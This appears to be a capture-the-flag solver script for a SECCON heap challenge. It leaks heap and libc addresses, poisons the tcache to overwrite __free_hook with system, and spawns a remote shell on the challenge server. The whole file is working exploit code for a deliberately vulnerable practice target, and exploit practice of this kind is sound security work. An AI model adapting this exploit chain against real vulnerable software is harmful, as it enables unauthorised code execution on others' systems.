from ptrlib import *

def add(data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", data)
    return
def show():
    sock.sendlineafter("> ", "2")
    return sock.recvline()
def delete():
    sock.sendlineafter("> ", "3")
    return

libc = ELF("./libc-2.27.so")
#sock = Process("./one")
sock = Socket("one.chal.seccon.jp", 18357)

# leak heap
add('A')
delete()
delete()
delete()
addr_heap = u64(show())
logger.info("heap = " + hex(addr_heap))

# tamper size
add(p64(addr_heap - 0x10))
add('dummy')
add(p64(addr_heap) + p64(0xdeadbeef))

# tamper tcache
for i in range(0x11):
    add(((p64(0) + p64(0x21)) * 3)[:-1])
add('A')
delete()
delete()
delete()
delete()
delete()
add(p64(addr_heap - 0x10))
add('A' * 8)
add(p64(0) + p64(0x421) + p64(addr_heap + 0x50))
add('A' * 8)
delete()
libc_base = u64(show()) - 0x3ebc40 - 96
logger.info("libc base = " + hex(libc_base))

# tcache poisoning
add('A')
delete()
delete()
add(p64(libc_base + libc.symbol("__free_hook")))
add('dummy')
add(p64(libc_base + libc.symbol("system")))
add("/bin/sh")
delete()

sock.interactive()
